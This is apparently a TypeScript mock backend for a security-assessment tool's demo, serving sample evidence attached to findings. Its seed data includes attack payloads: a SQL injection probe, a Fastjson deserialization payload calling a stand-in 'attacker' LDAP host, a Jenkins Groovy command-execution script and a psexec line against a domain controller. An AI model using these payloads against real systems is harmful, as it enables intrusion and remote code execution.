import type {
  EvidenceBodyPreview,
  FindingTraffic,
  FindingTrafficBinding,
  TrafficEvidenceRole,
  TrafficEvidenceSnapshot,
} from "../types";
import type * as SeedData from "./data";
import { DemoRows, patchDemoStrings } from "./demo-records";
import { type DemoRequest, UNHANDLED } from "./demo-protocol";

interface BindingSeed {
  traffic_id: string;
  role: TrafficEvidenceRole;
  note?: string;
}

const bindingSeeds: Record<string, BindingSeed[]> = {
  "f-1": [
    {
      traffic_id: "x-2",
      role: "proof",
      note: "The controlled SQL probe produced a database conversion error and confirmed the injectable request boundary.",
    },
  ],
  "f-2": [
    { traffic_id: "x-8", role: "baseline", note: "uroboros.lab demonstration record. Context: id, 1001." },
    { traffic_id: "x-9", role: "proof", note: "uroboros.lab demonstration record. Context: id, 1002." },
  ],
  "f-12": [
    {
      traffic_id: "x-15",
      role: "proof",
      note: "Fastjson deserialization triggered the controlled callback and confirmed remote code execution on the assessed host.",
    },
    { traffic_id: "x-16", role: "verification", note: "uroboros.lab demonstration record." },
  ],
  "f-15": [
    {
      traffic_id: "x-17",
      role: "baseline",
      note: "The Jenkins script surface accepted the controlled Groovy probe and produced reproducible execution evidence.",
    },
    {
      traffic_id: "x-18",
      role: "proof",
      note: "The Jenkins script surface accepted the controlled Groovy probe and produced reproducible execution evidence.",
    },
  ],
  "f-17": [
    {
      traffic_id: "x-19",
      role: "proof",
      note: "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
    },
  ],
};

const bodySeeds: Record<string, { req: string; resp: string }> = {
  "x-2": {
    req: "q=1' AND 1=CONVERT(int,@@version)--",
    resp: '{"error":"Conversion failed when converting the nvarchar value \'Microsoft SQL Server 2019 ...\' to data type int."}',
  },
  "x-8": { req: "", resp: '{"order_id":1001,"user_id":42,"amount":199.00}' },
  "x-9": { req: "", resp: "uroboros.lab demonstration record. Context: order_id, 1002, user_id, 77, amount." },
  "x-15": {
    req: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
    resp: '{"status":"error","message":"internal server error"}',
  },
  "x-16": { req: '{"cmd":"id"}', resp: '{"status":"ok","out":"uid=33(www-data) gid=33(www-data)"}' },
  "x-17": { req: "", resp: "<html><title>Jenkins Script Console</title>..." },
  "x-18": { req: "script=println 'whoami'.execute().text", resp: "nt authority\\system" },
  "x-19": { req: "[psexec] acme/svc_deploy@10.10.10.10", resp: "[*] Got SYSTEM on DC01" },
};

type Exchange = NonNullable<(typeof SeedData.traffic)["exchanges"]>[number];
type Document = { entries: DemoRows<FindingTrafficBinding, string>; version: number };
const missing = () => new Error("uroboros.lab demonstration record.");
const preview = (content: string): EvidenceBodyPreview => ({
  content,
  offset: 0,
  total: content.length,
  next_offset: content.length,
  truncated: false,
  binary: false,
});

/** A lazy evidence document owns binding identity, version and private headers together. */
export class FindingEvidence {
  private readonly exchanges: Map<string, Exchange>;
  private readonly documents = new Map<string, Document>();
  private sequence = 900;

  constructor(
    exchanges: readonly Exchange[],
    private readonly exists: (id: string) => boolean,
  ) {
    this.exchanges = new Map(exchanges.map((exchange) => [exchange.id, exchange]));
  }

  private snapshot(id: string): TrafficEvidenceSnapshot {
    const exchange = this.exchanges.get(id);
    let path = "/";
    if (exchange) {
      try {
        const address = new URL(exchange.url);
        path = address.pathname + address.search;
      } catch {
        /* Retain the default path for malformed recorded URLs. */
      }
    }
    const body = bodySeeds[id];
    const bytes = new TextEncoder();
    return {
      id: `snap-${id}`,
      source_traffic_id: id,
      captured_at: exchange ? Math.floor(Date.parse(exchange.ts) / 1000) : 0,
      url: exchange?.url ?? "",
      method: exchange?.method ?? "GET",
      status: exchange?.status ?? 0,
      content_type: exchange?.content_type ?? "",
      req_head: `${exchange?.method ?? "GET"} ${path} HTTP/1.1\nHost: ${exchange?.host ?? ""}`,
      resp_head: `HTTP/1.1 ${exchange?.status ?? 0}\nContent-Type: ${exchange?.content_type ?? ""}`,
      req_hash: `req-${id}`,
      resp_hash: `resp-${id}`,
      req_len: body ? bytes.encode(body.req).length : 0,
      resp_len: exchange?.resp_len ?? (body ? bytes.encode(body.resp).length : 0),
    };
  }

  private binding(finding: string, seed: BindingSeed, position: number, age?: number): FindingTrafficBinding {
    return {
      id: String(++this.sequence),
      finding_id: finding,
      snapshot_id: `snap-${seed.traffic_id}`,
      role: seed.role ?? "supporting",
      note: seed.note ?? "",
      position,
      created_at: age === undefined ? new Date().toISOString() : new Date(Date.now() - age).toISOString(),
      snapshot: this.snapshot(seed.traffic_id),
    };
  }

  private document(id: string): Document {
    let value = this.documents.get(id);
    if (!value) {
      const seeds = bindingSeeds[id] ?? [];
      const rows = seeds.map((seed, index) => this.binding(id, seed, index, (seeds.length - index) * 1000));
      value = { entries: new DemoRows(rows, (row) => row.id), version: 1 };
      this.documents.set(id, value);
    }
    return value;
  }

  count(id: string): number {
    return this.document(id).entries.rows.length;
  }

  summary(id: string): FindingTraffic {
    const document = this.document(id);
    const bindings = document.entries.rows.map((binding, position) => ({
      ...binding,
      position,
      snapshot: { ...binding.snapshot, req_head: "", resp_head: "" },
    }));
    return { finding_id: id, version: document.version, report_version: document.version, bindings };
  }

  respond({ method, segments, query, body }: DemoRequest): unknown {
    if (segments[0] !== "exploration" || segments[1] !== "findings" || segments[3] !== "traffic") return UNHANDLED;
    const id = segments[2];
    if (!this.exists(id)) throw missing();
    const document = this.document(id),
      entries = document.entries;
    const detail = () => {
      const value = entries.get(segments[4]);
      if (!value) throw missing();
      return value;
    };
    const bodies = (binding: FindingTrafficBinding) =>
      bodySeeds[binding.snapshot.source_traffic_id] ?? { req: "", resp: "" };

    if (method === "GET" && segments.length === 5 && segments[4] !== "order") {
      const binding = detail(),
        content = bodies(binding);
      return { binding: structuredClone(binding), request: preview(content.req), response: preview(content.resp) };
    }
    if (method === "GET" && segments.length === 6 && segments[5] === "body") {
      const content = bodies(detail());
      return preview(query.get("side") === "request" ? content.req : content.resp);
    }
    if (method === "POST" && segments.length === 4) {
      const refs = Array.isArray(body.traffic_refs) ? (body.traffic_refs as BindingSeed[]) : [];
      for (const ref of refs) {
        if (!ref.traffic_id || entries.rows.some((row) => row.snapshot.source_traffic_id === ref.traffic_id)) continue;
        entries.rows.push(this.binding(id, ref, entries.rows.length));
      }
    } else if (method === "PUT" && segments.length === 5 && segments[4] === "order") {
      entries.rank(Array.isArray(body.binding_ids) ? (body.binding_ids as string[]) : []);
    } else if (segments.length === 5 && (method === "PATCH" || method === "DELETE")) {
      const binding = detail();
      if (method === "DELETE") entries.remove(binding.id);
      else patchDemoStrings(binding, body, ["role", "note"]);
    } else return this.summary(id);
    document.version++;
    return this.summary(id);
  }
}
